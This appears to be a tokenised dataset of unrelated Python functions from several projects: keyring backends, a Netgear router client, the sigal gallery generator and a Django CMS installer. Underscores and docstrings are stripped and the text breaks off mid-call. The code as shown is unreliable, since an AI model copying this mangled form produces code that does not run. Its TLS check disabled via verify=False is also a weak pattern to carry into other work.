def select block ( str in , start tag , end tag ) : start pos = str in . find ( start tag ) if start pos < 0 : raise Value Error ( 'start tag not found' ) depth = 0 for pos in range ( start pos , len ( str in ) ) : if str in [ pos ] == start tag : depth += 1 elif str in [ pos ] == end tag : depth -= 1 if depth == 0 : break sel = str in [ start pos + 1 : pos ] return sel
def parse dict recursive ( dict str ) : dict out = dict ( ) pos last = 0 pos = dict str . find ( ':' ) while pos >= 0 : key = dict str [ pos last : pos ] if dict str [ pos + 1 ] == '[' : # value is a list pos tmp = dict str . find ( ']' , pos + 1 ) if pos tmp < 0 : raise Runtime Error ( 'error when parsing dict' ) value = dict str [ pos + 2 : pos tmp ] . split ( ',' ) # try to convert elements to int for i in range ( len ( value ) ) : try : value [ i ] = int ( value [ i ] ) except Value Error : pass elif dict str [ pos + 1 ] == '{' : # value is another dictionary subdict str = select block ( dict str [ pos : ] , '{' , '}' ) value = parse dict recursive ( subdict str ) pos tmp = pos + len ( subdict str ) else : raise Value Error ( 'error when parsing dict: unknown elem' ) key = key . strip ( '"' ) if len ( key ) > 0 : dict out [ key ] = value pos last = dict str . find ( ',' , pos tmp ) if pos last < 0 : break pos last += 1 pos = dict str . find ( ':' , pos last ) return dict out
def embed code links ( app , exception ) : if exception is not None : return # No need to waste time embedding hyperlinks when not running the examples # XXX: also at the time of writing this fixes make html-noplot # for some reason I don't fully understand if not app . builder . config . plot gallery : return # XXX: Whitelist of builders for which it makes sense to embed # hyperlinks inside the example html. Note that the link embedding # require searchindex.js to exist for the links to the local doc # and there does not seem to be a good way of knowing which # builders creates a searchindex.js. if app . builder . name not in [ 'html' , 'readthedocs' ] : return print ( 'Embedding documentation hyperlinks in examples..' ) gallery conf = app . config . sphinx gallery conf gallery dirs = gallery conf [ 'gallery dirs' ] if not isinstance ( gallery dirs , list ) : gallery dirs = [ gallery dirs ] for gallery dir in gallery dirs : embed code links ( app , gallery conf , gallery dir )
def get link ( self , cobj ) : fname idx = None full name = cobj [ 'module short' ] + '.' + cobj [ 'name' ] if full name in self . searchindex [ 'objects' ] : value = self . searchindex [ 'objects' ] [ full name ] if isinstance ( value , dict ) : value = value [ next ( iter ( value . keys ( ) ) ) ] fname idx = value [ 0 ] elif cobj [ 'module short' ] in self . searchindex [ 'objects' ] : value = self . searchindex [ 'objects' ] [ cobj [ 'module short' ] ] if cobj [ 'name' ] in value . keys ( ) : fname idx = value [ cobj [ 'name' ] ] [ 0 ] if fname idx is not None : fname = self . searchindex [ 'filenames' ] [ fname idx ] + '.html' if self . is windows : fname = fname . replace ( '/' , '\\' ) link = os . path . join ( self . doc url , fname ) else : link = posixpath . join ( self . doc url , fname ) if hasattr ( link , 'decode' ) : link = link . decode ( 'utf-8' , 'replace' ) if link in self . page cache : html = self . page cache [ link ] else : html = get data ( link , self . gallery dir ) self . page cache [ link ] = html # test if cobj appears in page comb names = [ cobj [ 'module short' ] + '.' + cobj [ 'name' ] ] if self . extra modules test is not None : for mod in self . extra modules test : comb names . append ( mod + '.' + cobj [ 'name' ] ) url = False if hasattr ( html , 'decode' ) : # Decode bytes under Python 3 html = html . decode ( 'utf-8' , 'replace' ) for comb name in comb names : if hasattr ( comb name , 'decode' ) : # Decode bytes under Python 3 comb name = comb name . decode ( 'utf-8' , 'replace' ) if comb name in html : url = link + u'#' + comb name link = url else : link = False return link
def get short module name ( module name , obj name ) : parts = module name . split ( '.' ) short name = module name for i in range ( len ( parts ) - 1 , 0 , - 1 ) : short name = '.' . join ( parts [ : i ] ) try : exec ( 'from %s import %s' % ( short name , obj name ) ) except Import Error : # get the last working module name short name = '.' . join ( parts [ : ( i + 1 ) ] ) break return short name
def thumbnail div ( full dir , fname , snippet , is backref = False ) : thumb = os . path . join ( full dir , 'images' , 'thumb' , 'sphx glr %s thumb.png' % fname [ : - 3 ] ) ref name = os . path . join ( full dir , fname ) . replace ( os . path . sep , ' ' ) template = BACKREF THUMBNAIL TEMPLATE if is backref else THUMBNAIL TEMPLATE return template . format ( snippet = snippet , thumbnail = thumb , ref name = ref name )
def main ( argv = None ) : if argv is None : argv = sys . argv [ 1 : ] cli = Command Line Tool ( ) return cli . run ( argv )
def pass from pipe ( cls ) : is pipe = not sys . stdin . isatty ( ) return is pipe and cls . strip last newline ( sys . stdin . read ( ) )
def get password ( self , service , username ) : if not self . connected ( service ) : # the user pressed "cancel" when prompted to unlock their keyring. raise Keyring Locked ( "Failed to unlock the keyring!" ) if not self . iface . has Entry ( self . handle , service , username , self . appid ) : return None password = self . iface . read Password ( self . handle , service , username , self . appid ) return str ( password )
def set password ( self , service , username , password ) : if not self . connected ( service ) : # the user pressed "cancel" when prompted to unlock their keyring. raise Password Set Error ( "Cancelled by user" ) self . iface . write Password ( self . handle , service , username , password , self . appid )
def delete password ( self , service , username ) : if not self . connected ( service ) : # the user pressed "cancel" when prompted to unlock their keyring. raise Password Delete Error ( "Cancelled by user" ) if not self . iface . has Entry ( self . handle , service , username , self . appid ) : raise Password Delete Error ( "Password not found" ) self . iface . remove Entry ( self . handle , service , username , self . appid )
def get env ( self , env var ) : value = os . environ . get ( env var ) if not value : raise Value Error ( 'Missing environment variable:%s' % env var ) return value
def get password ( self , service , username ) : collection = self . get preferred collection ( ) items = collection . search items ( { "username" : username , "service" : service } ) for item in items : if hasattr ( item , 'unlock' ) : item . unlock ( ) if item . is locked ( ) : # User dismissed the prompt raise Keyring Locked ( 'Failed to unlock the item!' ) return item . get secret ( ) . decode ( 'utf-8' )
def set password ( self , service , username , password ) : collection = self . get preferred collection ( ) attributes = { "application" : self . appid , "service" : service , "username" : username } label = "Password for '{}' on '{}'" . format ( username , service ) collection . create item ( label , attributes , password , replace = True )
def backends ( cls ) : allowed = ( keyring for keyring in filter ( backend . limit , backend . get all keyring ( ) ) if not isinstance ( keyring , Chainer Backend ) and keyring . priority > 0 ) return sorted ( allowed , key = backend . by priority , reverse = True )
def set keyring ( keyring ) : global keyring backend if not isinstance ( keyring , backend . Keyring Backend ) : raise Type Error ( "The keyring must be a subclass of Keyring Backend" ) keyring backend = keyring
def disable ( ) : root = platform . config root ( ) try : os . makedirs ( root ) except OS Error : pass filename = os . path . join ( root , 'keyringrc.cfg' ) if os . path . exists ( filename ) : msg = "Refusing to overwrite {filename}" . format ( * * locals ( ) ) raise Runtime Error ( msg ) with open ( filename , 'w' ) as file : file . write ( '[backend]\ndefault-keyring=keyring.backends.null.Keyring' )
def load config ( ) : filename = 'keyringrc.cfg' keyring cfg = os . path . join ( platform . config root ( ) , filename ) if not os . path . exists ( keyring cfg ) : return config = configparser . Raw Config Parser ( ) config . read ( keyring cfg ) load keyring path ( config ) # load the keyring class name, and then load this keyring try : if config . has section ( "backend" ) : keyring name = config . get ( "backend" , "default-keyring" ) . strip ( ) else : raise configparser . No Option Error ( 'backend' , 'default-keyring' ) except ( configparser . No Option Error , Import Error ) : logger = logging . get Logger ( 'keyring' ) logger . warning ( "Keyring config file contains incorrect values.\n" + "Config file: %s" % keyring cfg ) return return load keyring ( keyring name )
def make formatter ( format name ) : if "json" in format name : from json import dumps import datetime def jsonhandler ( obj ) : obj . isoformat ( ) if isinstance ( obj , ( datetime . datetime , datetime . date ) ) else obj if format name == "prettyjson" : def jsondumps ( data ) : return dumps ( data , default = jsonhandler , indent = 2 , separators = ( ',' , ': ' ) ) else : def jsondumps ( data ) : return dumps ( data , default = jsonhandler ) def jsonify ( data ) : if isinstance ( data , dict ) : print ( jsondumps ( data ) ) elif isinstance ( data , list ) : print ( jsondumps ( [ device . asdict ( ) for device in data ] ) ) else : print ( dumps ( { 'result' : data } ) ) return jsonify else : def printer ( data ) : if isinstance ( data , dict ) : print ( data ) else : for row in data : print ( row ) return printer
def argparser ( ) : parser = Argument Parser ( prog = 'pynetgear' ) parser . add argument ( "--format" , choices = [ 'json' , 'prettyjson' , 'py' ] , default = 'prettyjson' ) router args = parser . add argument group ( "router connection config" ) router args . add argument ( "--host" , help = "Hostname for the router" ) router args . add argument ( "--user" , help = "Account for login" ) router args . add argument ( "--port" , help = "Port exposed on the router" ) router args . add argument ( "--login-v2" , help = "Force the use of the cookie-based authentication" , dest = "force login v2" , default = False , action = "store true" ) router args . add argument ( "--password" , help = "Not required with a wired connection." + "Optionally, set the PYNETGEAR PASSWORD environment variable" ) router args . add argument ( "--url" , help = "Overrides host:port and ssl with url to router" ) router args . add argument ( "--no-ssl" , dest = "ssl" , default = True , action = "store false" , help = "Connect with https" ) subparsers = parser . add subparsers ( description = "Runs subcommand against the specified router" , dest = "subcommand" ) block parser = subparsers . add parser ( "block device" , help = "Blocks a device from connecting by mac address" ) block parser . add argument ( "--mac-addr" ) allow parser = subparsers . add parser ( "allow device" , help = "Allows a device with the mac address to connect" ) allow parser . add argument ( "--mac-addr" ) subparsers . add parser ( "login" , help = "Attempts to login to router." ) attached devices = subparsers . add parser ( "attached devices" , help = "Outputs all attached devices" ) attached devices . add argument ( "-v" , "--verbose" , action = "store true" , default = False , help = "Choose between verbose and slower or terse and fast." ) subparsers . add parser ( "traffic meter" , help = "Output router's traffic meter data" ) return parser
def run subcommand ( netgear , args ) : subcommand = args . subcommand if subcommand == "block device" or subcommand == "allow device" : return netgear . allow block device ( args . mac addr , BLOCK if subcommand == "block device" else ALLOW ) if subcommand == "attached devices" : if args . verbose : return netgear . get attached devices 2 ( ) else : return netgear . get attached devices ( ) if subcommand == 'traffic meter' : return netgear . get traffic meter ( ) if subcommand == 'login' : return netgear . login ( ) print ( "Unknown subcommand" )
def main ( ) : args = argparser ( ) . parse args ( sys . argv [ 1 : ] ) password = os . environ . get ( 'PYNETGEAR PASSWORD' ) or args . password netgear = Netgear ( password , args . host , args . user , args . port , args . ssl , args . url , args . force login v2 ) results = run subcommand ( netgear , args ) formatter = make formatter ( args . format ) if results is None : print ( "Error communicating with the Netgear router" ) else : formatter ( results )
def convert ( value , to type , default = None ) : try : return default if value is None else to type ( value ) except Value Error : # If value could not be converted return default
def make request ( self , service , method , params = None , body = "" , need auth = True ) : # If we have no cookie (v2) or never called login before (v1) # and we need auth, the request will fail for sure. if need auth and not self . cookie : if not self . login ( ) : return False , None headers = self . get headers ( service , method , need auth ) if not body : if not params : params = "" if isinstance ( params , dict ) : map = params params = "" for k in map : params += "<" + k + ">" + map [ k ] + "</" + k + ">\n" body = CALL BODY . format ( service = SERVICE PREFIX + service , method = method , params = params ) message = SOAP REQUEST . format ( session id = SESSION ID , body = body ) try : response = requests . post ( self . soap url , headers = headers , data = message , timeout = 30 , verify = False ) if need auth and is unauthorized response ( response ) : # let's discard the cookie because it probably expired (v2) # or the IP-bound (?) session expired (v1) self . cookie = None LOGGER . warning ( "Unauthorized response, let's login and retry..." ) if self . login ( ) : # reset headers with new cookie first headers = self . get headers ( service , method , need auth ) response = requests . post ( self . soap url , headers = headers , data = message , timeout = 30 , verify = False ) success = is valid response ( response ) if not success : LOGGER . error ( "Invalid response" ) LOGGER . debug ( "%s\n%s\n%s" , response . status code , str ( response . headers ) , response . text ) return success , response except requests . exceptions . Request Exception : LOGGER . exception ( "Error talking to API" ) # Maybe one day we will distinguish between # different errors.. return False , None
def gethostbyname ( self , hostname ) : if self . database Type in const . IPV6 EDITIONS : response = socket . getaddrinfo ( hostname , 0 , socket . AF INET6 ) family , socktype , proto , canonname , sockaddr = response [ 0 ] address , port , flow , scope = sockaddr return address else : return socket . gethostbyname ( hostname )
def compress ( self , filename ) : compressed filename = self . get compressed filename ( filename ) if not compressed filename : return self . do compress ( filename , compressed filename )
def copy ( src , dst , symlink = False , rellink = False ) : func = os . symlink if symlink else shutil . copy2 if symlink and os . path . lexists ( dst ) : os . remove ( dst ) if rellink : # relative symlink from dst func ( os . path . relpath ( src , os . path . dirname ( dst ) ) , dst ) else : func ( src , dst )
def url from path ( path ) : if os . sep != '/' : path = '/' . join ( path . split ( os . sep ) ) return quote ( path )
def load exif ( album ) : if not hasattr ( album . gallery , "exif Cache" ) : restore cache ( album . gallery ) cache = album . gallery . exif Cache for media in album . medias : if media . type == "image" : key = os . path . join ( media . path , media . filename ) if key in cache : media . exif = cache [ key ]
def restore cache ( gallery ) : cache Path = os . path . join ( gallery . settings [ "destination" ] , ".exif cache" ) try : if os . path . exists ( cache Path ) : with open ( cache Path , "rb" ) as cache File : gallery . exif Cache = pickle . load ( cache File ) logger . debug ( "Loaded cache with %d entries" , len ( gallery . exif Cache ) ) else : gallery . exif Cache = { } except Exception as e : logger . warn ( "Could not load cache: %s" , e ) gallery . exif Cache = { }
def save cache ( gallery ) : if hasattr ( gallery , "exif Cache" ) : cache = gallery . exif Cache else : cache = gallery . exif Cache = { } for album in gallery . albums . values ( ) : for image in album . images : cache [ os . path . join ( image . path , image . filename ) ] = image . exif cache Path = os . path . join ( gallery . settings [ "destination" ] , ".exif cache" ) if len ( cache ) == 0 : if os . path . exists ( cache Path ) : os . remove ( cache Path ) return try : with open ( cache Path , "wb" ) as cache File : pickle . dump ( cache , cache File ) logger . debug ( "Stored cache with %d entries" , len ( gallery . exif Cache ) ) except Exception as e : logger . warn ( "Could not store cache: %s" , e ) os . remove ( cache Path )
def filter nomedia ( album , settings = None ) : nomediapath = os . path . join ( album . src path , ".nomedia" ) if os . path . isfile ( nomediapath ) : if os . path . getsize ( nomediapath ) == 0 : logger . info ( "Ignoring album '%s' because of present 0-byte " ".nomedia file" , album . name ) # subdirs have been added to the gallery already, remove them # there, too remove albums with subdirs ( album . gallery . albums , [ album . path ] ) try : os . rmdir ( album . dst path ) except OS Error as e : # directory was created and populated with images in a # previous run => keep it pass # cannot set albums => empty subdirs so that no albums are # generated album . subdirs = [ ] album . medias = [ ] else : with open ( nomediapath , "r" ) as nomedia File : logger . info ( "Found a .nomedia file in %s, ignoring its " "entries" , album . name ) ignored = nomedia File . read ( ) . split ( "\n" ) album . medias = [ media for media in album . medias if media . src filename not in ignored ] album . subdirs = [ dirname for dirname in album . subdirs if dirname not in ignored ] # subdirs have been added to the gallery already, remove # them there, too remove albums with subdirs ( album . gallery . albums , ignored , album . path + os . path . sep )
def serve ( destination , port , config ) : if os . path . exists ( destination ) : pass elif os . path . exists ( config ) : settings = read settings ( config ) destination = settings . get ( 'destination' ) if not os . path . exists ( destination ) : sys . stderr . write ( "The '{}' directory doesn't exist, maybe try " "building first?\n" . format ( destination ) ) sys . exit ( 1 ) else : sys . stderr . write ( "The {destination} directory doesn't exist " "and the config file ({config}) could not be read.\n" . format ( destination = destination , config = config ) ) sys . exit ( 2 ) print ( 'DESTINATION : {}' . format ( destination ) ) os . chdir ( destination ) Handler = server . Simple HTTP Request Handler httpd = socketserver . TCP Server ( ( "" , port ) , Handler , False ) print ( " * Running on http://127.0.0.1:{}/" . format ( port ) ) try : httpd . allow reuse address = True httpd . server bind ( ) httpd . server activate ( ) httpd . serve forever ( ) except Keyboard Interrupt : print ( '\n All done!' )
def generate thumbnail ( source , outname , box , fit = True , options = None , thumb fit centering = ( 0.5 , 0.5 ) ) : logger = logging . get Logger ( name ) img = read image ( source ) original format = img . format if fit : img = Image Ops . fit ( img , box , PIL Image . ANTIALIAS , centering = thumb fit centering ) else : img . thumbnail ( box , PIL Image . ANTIALIAS ) outformat = img . format or original format or 'JPEG' logger . debug ( 'Save thumnail image: %s (%s)' , outname , outformat ) save image ( img , outname , outformat , options = options , autoconvert = True )
def get exif data ( filename ) : logger = logging . get Logger ( name ) img = read image ( filename ) try : exif = img . getexif ( ) or { } except Zero Division Error : logger . warning ( 'Failed to read EXIF data.' ) return None data = { TAGS . get ( tag , tag ) : value for tag , value in exif . items ( ) } if 'GPS Info' in data : try : data [ 'GPS Info' ] = { GPSTAGS . get ( tag , tag ) : value for tag , value in data [ 'GPS Info' ] . items ( ) } except Attribute Error : logger = logging . get Logger ( name ) logger . info ( 'Failed to get GPS Info' ) del data [ 'GPS Info' ] return data
def get iptc data ( filename ) : logger = logging . get Logger ( name ) iptc data = { } raw iptc = { } # PI Ls Iptc Image Plugin issues a Syntax Error in certain circumstances # with malformed metadata, see PIL/Iptc Image Plugin.py", line 71. try : img = read image ( filename ) raw iptc = Iptc Image Plugin . getiptcinfo ( img ) except Syntax Error : logger . info ( 'IPTC Error in %s' , filename ) # IPTC fields are catalogued in: # https://www.iptc.org/std/photometadata/specification/IPTC-Photo Metadata # 2:05 is the IPTC title property if raw iptc and ( 2 , 5 ) in raw iptc : iptc data [ "title" ] = raw iptc [ ( 2 , 5 ) ] . decode ( 'utf-8' , errors = 'replace' ) # 2:120 is the IPTC description property if raw iptc and ( 2 , 120 ) in raw iptc : iptc data [ "description" ] = raw iptc [ ( 2 , 120 ) ] . decode ( 'utf-8' , errors = 'replace' ) # 2:105 is the IPTC headline property if raw iptc and ( 2 , 105 ) in raw iptc : iptc data [ "headline" ] = raw iptc [ ( 2 , 105 ) ] . decode ( 'utf-8' , errors = 'replace' ) return iptc data
def get exif tags ( data , datetime format = '%c' ) : logger = logging . get Logger ( name ) simple = { } for tag in ( 'Model' , 'Make' , 'Lens Model' ) : if tag in data : if isinstance ( data [ tag ] , tuple ) : simple [ tag ] = data [ tag ] [ 0 ] . strip ( ) else : simple [ tag ] = data [ tag ] . strip ( ) if 'F Number' in data : fnumber = data [ 'F Number' ] try : simple [ 'fstop' ] = float ( fnumber [ 0 ] ) / fnumber [ 1 ] except Exception : logger . debug ( 'Skipped invalid F Number: %r' , fnumber , exc info = True ) if 'Focal Length' in data : focal = data [ 'Focal Length' ] try : simple [ 'focal' ] = round ( float ( focal [ 0 ] ) / focal [ 1 ] ) except Exception : logger . debug ( 'Skipped invalid Focal Length: %r' , focal , exc info = True ) if 'Exposure Time' in data : exptime = data [ 'Exposure Time' ] if isinstance ( exptime , tuple ) : try : simple [ 'exposure' ] = str ( fractions . Fraction ( exptime [ 0 ] , exptime [ 1 ] ) ) except Zero Division Error : logger . info ( 'Invalid Exposure Time: %r' , exptime ) elif isinstance ( exptime , int ) : simple [ 'exposure' ] = str ( exptime ) else : logger . info ( 'Unknown format for Exposure Time: %r' , exptime ) if data . get ( 'ISO Speed Ratings' ) : simple [ 'iso' ] = data [ 'ISO Speed Ratings' ] if 'Date Time Original' in data : # Remove null bytes at the end if necessary date = data [ 'Date Time Original' ] . rsplit ( '\x00' ) [ 0 ] try : simple [ 'dateobj' ] = datetime . strptime ( date , '%Y:%m:%d %H:%M:%S' ) simple [ 'datetime' ] = simple [ 'dateobj' ] . strftime ( datetime format ) except ( Value Error , Type Error ) as e : logger . info ( 'Could not parse Date Time Original: %s' , e ) if 'GPS Info' in data : info = data [ 'GPS Info' ] lat info = info . get ( 'GPS Latitude' ) lon info = info . get ( 'GPS Longitude' ) lat ref info = info . get ( 'GPS Latitude Ref' ) lon ref info = info . get ( 'GPS Longitude Ref' ) if lat info and lon info and lat ref info and lon ref info : try : lat = dms to degrees ( lat info ) lon = dms to degrees ( lon info ) except ( Zero Division Error , Value Error , Type Error ) : logger . info ( 'Failed to read GPS info' ) else : simple [ 'gps' ] = { 'lat' : - lat if lat ref info != 'N' else lat , 'lon' : - lon if lon ref info != 'E' else lon , } return simple
def create output directories ( self ) : check or create dir ( self . dst path ) if self . medias : check or create dir ( join ( self . dst path , self . settings [ 'thumb dir' ] ) ) if self . medias and self . settings [ 'keep orig' ] : self . orig path = join ( self . dst path , self . settings [ 'orig dir' ] ) check or create dir ( self . orig path )
def url ( self ) : url = self . name . encode ( 'utf-8' ) return url quote ( url ) + '/' + self . url ext
def thumbnail ( self ) : if self . thumbnail : # stop if it is already set return self . thumbnail # Test the thumbnail from the Markdown file. thumbnail = self . meta . get ( 'thumbnail' , [ '' ] ) [ 0 ] if thumbnail and isfile ( join ( self . src path , thumbnail ) ) : self . thumbnail = url from path ( join ( self . name , get thumb ( self . settings , thumbnail ) ) ) self . logger . debug ( "Thumbnail for %r : %s" , self , self . thumbnail ) return self . thumbnail else : # find and return the first landscape image for f in self . medias : ext = splitext ( f . filename ) [ 1 ] if ext . lower ( ) in self . settings [ 'img extensions' ] : # Use f.size if available as it is quicker (in cache), but # fallback to the size of src path if dst path is missing size = f . size if size is None : size = get size ( f . src path ) if size [ 'width' ] > size [ 'height' ] : self . thumbnail = ( url quote ( self . name ) + '/' + f . thumbnail ) self . logger . debug ( "Use 1st landscape image as thumbnail for %r : %s" , self , self . thumbnail ) return self . thumbnail # else simply return the 1st media file if not self . thumbnail and self . medias : for media in self . medias : if media . thumbnail is not None : self . thumbnail = ( url quote ( self . name ) + '/' + media . thumbnail ) break else : self . logger . warning ( "No thumbnail found for %r" , self ) return None self . logger . debug ( "Use the 1st image as thumbnail for %r : %s" , self , self . thumbnail ) return self . thumbnail # use the thumbnail of their sub-directories if not self . thumbnail : for path , album in self . gallery . get albums ( self . path ) : if album . thumbnail : self . thumbnail = ( url quote ( self . name ) + '/' + album . thumbnail ) self . logger . debug ( "Using thumbnail from sub-directory for %r : %s" , self , self . thumbnail ) return self . thumbnail self . logger . error ( 'Thumbnail not found for %r' , self ) return None
def get albums ( self , path ) : for name in self . albums [ path ] . subdirs : subdir = os . path . normpath ( join ( path , name ) ) yield subdir , self . albums [ subdir ] for subname , album in self . get albums ( subdir ) : yield subname , self . albums [ subdir ]
def build ( self , force = False ) : if not self . albums : self . logger . warning ( "No albums found." ) return def log func ( x ) : # 63 is the total length of progressbar, label, percentage, etc available length = get terminal size ( ) [ 0 ] - 64 if x and available length > 10 : return x . name [ : available length ] else : return "" try : with progressbar ( self . albums . values ( ) , label = "Collecting files" , item show func = log func , show eta = False , file = self . progressbar target ) as albums : media list = [ f for album in albums for f in self . process dir ( album , force = force ) ] except Keyboard Interrupt : sys . exit ( 'Interrupted' ) bar opt = { 'label' : "Processing files" , 'show pos' : True , 'file' : self . progressbar target } failed files = [ ] if self . pool : try : with progressbar ( length = len ( media list ) , * * bar opt ) as bar : for res in self . pool . imap unordered ( worker , media list ) : if res : failed files . append ( res ) bar . update ( 1 ) self . pool . close ( ) self . pool . join ( ) except Keyboard Interrupt : self . pool . terminate ( ) sys . exit ( 'Interrupted' ) except pickle . Pickling Error : self . logger . critical ( "Failed to process files with the multiprocessing feature." " This can be caused by some module import or object " "defined in the settings file, which can't be serialized." , exc info = True ) sys . exit ( 'Abort' ) else : with progressbar ( media list , * * bar opt ) as medias : for media item in medias : res = process file ( media item ) if res : failed files . append ( res ) if failed files : self . remove files ( failed files ) if self . settings [ 'write html' ] : album writer = Album Page Writer ( self . settings , index title = self . title ) album list writer = Album List Page Writer ( self . settings , index title = self . title ) with progressbar ( self . albums . values ( ) , label = "%16s" % "Writing files" , item show func = log func , show eta = False , file = self . progressbar target ) as albums : for album in albums : if album . albums : if album . medias : self . logger . warning ( "Album %s contains sub-albums and images. " "Please move images to their own sub-album. " "Images in album %s will not be visible." , album . title , album . title ) album list writer . write ( album ) else : album writer . write ( album ) print ( '' ) signals . gallery build . send ( self )
def process dir ( self , album , force = False ) : for f in album : if isfile ( f . dst path ) and not force : self . logger . info ( "%s exists - skipping" , f . filename ) self . stats [ f . type + ' skipped' ] += 1 else : self . stats [ f . type ] += 1 yield ( f . type , f . path , f . filename , f . src path , album . dst path , self . settings )
def reduce opacity ( im , opacity ) : assert opacity >= 0 and opacity <= 1 if im . mode != 'RGBA' : im = im . convert ( 'RGBA' ) else : im = im . copy ( ) alpha = im . split ( ) [ 3 ] alpha = Image Enhance . Brightness ( alpha ) . enhance ( opacity ) im . putalpha ( alpha ) return im
def watermark ( im , mark , position , opacity = 1 ) : if opacity < 1 : mark = reduce opacity ( mark , opacity ) if im . mode != 'RGBA' : im = im . convert ( 'RGBA' ) # create a transparent layer the size of the image and draw the # watermark in that layer. layer = Image . new ( 'RGBA' , im . size , ( 0 , 0 , 0 , 0 ) ) if position == 'tile' : for y in range ( 0 , im . size [ 1 ] , mark . size [ 1 ] ) : for x in range ( 0 , im . size [ 0 ] , mark . size [ 0 ] ) : layer . paste ( mark , ( x , y ) ) elif position == 'scale' : # scale, but preserve the aspect ratio ratio = min ( float ( im . size [ 0 ] ) / mark . size [ 0 ] , float ( im . size [ 1 ] ) / mark . size [ 1 ] ) w = int ( mark . size [ 0 ] * ratio ) h = int ( mark . size [ 1 ] * ratio ) mark = mark . resize ( ( w , h ) ) layer . paste ( mark , ( int ( ( im . size [ 0 ] - w ) / 2 ) , int ( ( im . size [ 1 ] - h ) / 2 ) ) ) else : layer . paste ( mark , position ) # composite the watermark with the layer return Image . composite ( layer , im , layer )
def video size ( source , converter = 'ffmpeg' ) : res = subprocess . run ( [ converter , '-i' , source ] , stderr = subprocess . PIPE ) stderr = res . stderr . decode ( 'utf8' ) pattern = re . compile ( r'Stream.*Video.* ([0-9]+)x([0-9]+)' ) match = pattern . search ( stderr ) rot pattern = re . compile ( r'rotate\s*:\s*-?(90|270)' ) rot match = rot pattern . search ( stderr ) if match : x , y = int ( match . groups ( ) [ 0 ] ) , int ( match . groups ( ) [ 1 ] ) else : x = y = 0 if rot match : x , y = y , x return x , y
def generate thumbnail ( source , outname , box , delay , fit = True , options = None , converter = 'ffmpeg' ) : logger = logging . get Logger ( name ) tmpfile = outname + ".tmp.jpg" # dump an image of the video cmd = [ converter , '-i' , source , '-an' , '-r' , '1' , '-ss' , delay , '-vframes' , '1' , '-y' , tmpfile ] logger . debug ( 'Create thumbnail for video: %s' , ' ' . join ( cmd ) ) check subprocess ( cmd , source , outname ) # use the generate thumbnail function from sigal.image image . generate thumbnail ( tmpfile , outname , box , fit = fit , options = options ) # remove the image os . unlink ( tmpfile )
def generate context ( self , album ) : from . import url as sigal link self . logger . info ( "Output album : %r" , album ) return { 'album' : album , 'index title' : self . index title , 'settings' : self . settings , 'sigal link' : sigal link , 'theme' : { 'name' : os . path . basename ( self . theme ) , 'url' : url from path ( os . path . relpath ( self . theme path , album . dst path ) ) } , }
def write ( self , album ) : page = self . template . render ( * * self . generate context ( album ) ) output file = os . path . join ( album . dst path , album . output file ) with open ( output file , 'w' , encoding = 'utf-8' ) as f : f . write ( page )
def read settings ( filename = None ) : logger = logging . get Logger ( name ) logger . info ( "Reading settings ..." ) settings = DEFAULT CONFIG . copy ( ) if filename : logger . debug ( "Settings file: %s" , filename ) settings path = os . path . dirname ( filename ) tempdict = { } with open ( filename ) as f : code = compile ( f . read ( ) , filename , 'exec' ) exec ( code , tempdict ) settings . update ( ( k , v ) for k , v in tempdict . items ( ) if k not in [ ' builtins ' ] ) # Make the paths relative to the settings file paths = [ 'source' , 'destination' , 'watermark' ] if os . path . isdir ( join ( settings path , settings [ 'theme' ] ) ) and os . path . isdir ( join ( settings path , settings [ 'theme' ] , 'templates' ) ) : paths . append ( 'theme' ) for p in paths : path = settings [ p ] if path and not isabs ( path ) : settings [ p ] = abspath ( normpath ( join ( settings path , path ) ) ) logger . debug ( "Rewrite %s : %s -> %s" , p , path , settings [ p ] ) for key in ( 'img size' , 'thumb size' , 'video size' ) : w , h = settings [ key ] if h > w : settings [ key ] = ( h , w ) logger . warning ( "The %s setting should be specified with the " "largest value first." , key ) if not settings [ 'img processor' ] : logger . info ( 'No Processor, images will not be resized' ) logger . debug ( 'Settings:\n%s' , pformat ( settings , width = 120 ) ) return settings
def generate media pages ( gallery ) : writer = Page Writer ( gallery . settings , index title = gallery . title ) for album in gallery . albums . values ( ) : medias = album . medias next medias = medias [ 1 : ] + [ None ] previous medias = [ None ] + medias [ : - 1 ] # The media group allows us to easily get next and previous links media groups = zip ( medias , next medias , previous medias ) for media group in media groups : writer . write ( album , media group )
def write ( self , album , media group ) : from sigal import url as sigal link file path = os . path . join ( album . dst path , media group [ 0 ] . filename ) page = self . template . render ( { 'album' : album , 'media' : media group [ 0 ] , 'previous media' : media group [ - 1 ] , 'next media' : media group [ 1 ] , 'index title' : self . index title , 'settings' : self . settings , 'sigal link' : sigal link , 'theme' : { 'name' : os . path . basename ( self . theme ) , 'url' : url from path ( os . path . relpath ( self . theme path , album . dst path ) ) } , } ) output file = "%s.html" % file path with open ( output file , 'w' , encoding = 'utf-8' ) as f : f . write ( page )
def cleanup directory ( config data ) : if os . path . exists ( config data . project directory ) : choice = False if config data . noinput is False and not config data . verbose : choice = query yes no ( 'The installation failed.\n' 'Do you want to clean up by removing {0}?\n' '\t Warning: this will delete all files in:\n' '\t\t{0}\n' 'Do you want to cleanup?' . format ( os . path . abspath ( config data . project directory ) ) , 'no' ) else : sys . stdout . write ( 'The installation has failed.\n' ) if config data . skip project dir check is False and ( choice or ( config data . noinput and config data . delete project dir ) ) : sys . stdout . write ( 'Removing everything under {0}\n' . format ( os . path . abspath ( config data . project directory ) ) ) shutil . rmtree ( config data . project directory , True )
def parse ( args ) : from tzlocal import get localzone try : timezone = get localzone ( ) if isinstance ( timezone , pytz . Base Tz Info ) : timezone = timezone . zone except Exception : # pragma: no cover timezone = 'UTC' if timezone == 'local' : timezone = 'UTC' parser = argparse . Argument Parser ( description = , formatter class = argparse . Raw Text Help Formatter ) parser . add argument ( '--config-file' , dest = 'config file' , action = 'store' , default = None , help = 'Configuration file for djangocms installer' ) parser . add argument ( '--config-dump' , dest = 'config dump' , action = 'store' , default = None , help = 'Dump configuration file with current args' ) parser . add argument ( '--db' , '-d' , dest = 'db' , action = Db Action , default = 'sqlite://localhost/project.db' , help = 'Database configuration (in URL format). ' 'Example: sqlite://localhost/project.db' ) parser . add argument ( '--i18n' , '-i' , dest = 'i18n' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'yes' , help = 'Activate Django I18N / L10N setting; this is ' 'automatically activated if more than ' 'language is provided' ) parser . add argument ( '--use-tz' , '-z' , dest = 'use timezone' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'yes' , help = 'Activate Django timezone support' ) parser . add argument ( '--timezone' , '-t' , dest = 'timezone' , required = False , default = timezone , action = 'store' , help = 'Optional default time zone. Example: 